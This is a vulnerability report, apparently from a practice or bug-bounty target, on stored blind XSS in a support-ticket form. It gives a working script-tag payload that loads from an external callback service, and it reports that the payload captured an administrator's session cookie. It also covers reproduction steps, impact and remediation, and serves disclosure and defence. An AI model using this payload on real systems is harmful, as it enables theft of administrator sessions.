## Title
Blind XSS - SupportHub Customer Support

## Description
A Stored Blind Cross-Site Scripting (XSS) vulnerability was identified in the SupportHub customer support request form. User-supplied input is stored and later rendered in the administrative interface without proper sanitization or output encoding.

A JavaScript payload submitted through the support request form executes when an administrator views the affected ticket. The execution was confirmed through an external XSS callback service, which recorded the administrator's page URL, referrer, and PHP session cookie.

**Affected URL:** https://supporthub.pwnedbox.site/submit.php

## Steps to Reproduce
1. Open the SupportHub customer support submission page.
2. Enter the XSS payload into the Name, Subject, and Message fields.
3. Submit the support request.
4. Wait for an administrator to open the submitted ticket.
5. Check the XSS callback dashboard for the captured interaction.

## POC (Proof of Concept)
**Target:** https://supporthub.pwnedbox.site/submit.php

**Affected functionality:** Customer support request submission and administrative ticket viewing.

**Payload:**
```html
"><script src=https://xss.report/c/mihir></script>
```

**Injection points:** Name, Subject, and Message fields.

**Observed Result:**
The submitted payload was stored and executed when the administrator viewed the ticket. The external XSS callback dashboard recorded requests originating from the administrative ticket-view page.

The captured evidence included:
- **Vulnerable page:** `https://supporthub.pwnedbox.site/admin/view.php?id=2`
- **Referrer:** `https://supporthub.pwnedbox.site/admin/index.php`
- **Origin:** `https://supporthub.pwnedbox.site`
- **Cookie:** A `PHPSESSID` session cookie was captured.
- **Session Storage / Local Storage:** Not captured in the demonstrated evidence.

**Screenshot Evidence:**
1. SupportHub customer support form containing the injected payload.
<img width="1919" height="986" alt="image" src="https://github.com/user-attachments/assets/ff422e7c-7158-4e7f-b122-a8699c8fc242" />

2. SupportHub administrative dashboard displaying the submitted support tickets.
<img width="1919" height="992" alt="image" src="https://github.com/user-attachments/assets/fcea407c-b337-4834-bfec-b7c00b32f31b" />

3. XSS callback dashboard showing requests originating from the administrative ticket-view page.
<img width="1919" height="1016" alt="image" src="https://github.com/user-attachments/assets/47702463-a95b-4002-bd30-43ab1178a5fd" />

4. XSS report details showing the affected URL, referrer, origin, and captured PHP session cookie.
<img width="1919" height="969" alt="image" src="https://github.com/user-attachments/assets/e3756158-04eb-4cac-8d67-0009299461b7" />

## Impact
An attacker can submit a crafted support request that stores malicious JavaScript and executes it in an administrator's browser when the ticket is viewed.

Potential consequences include:
- Theft of administrator session cookies, if they are accessible to JavaScript.
- Unauthorized actions performed within the administrator's authenticated session, depending on application protections.
- Access to sensitive information displayed in the administrative interface.
- Further compromise of administrative functionality through malicious browser-side actions.

The captured PHP session cookie demonstrates that sensitive session information was exposed through the callback.

## Remediation
1. Apply context-aware output encoding to all user-controlled data before rendering it in administrative pages.
2. Sanitize user input using a trusted HTML sanitization library where HTML input is permitted.
3. Avoid rendering untrusted input as executable HTML or JavaScript.
4. Implement a restrictive Content Security Policy (CSP) to reduce the impact of injected scripts.
5. Set session cookies with the `HttpOnly`, `Secure`, and appropriate `SameSite` attributes to prevent JavaScript access and reduce cookie exposure.
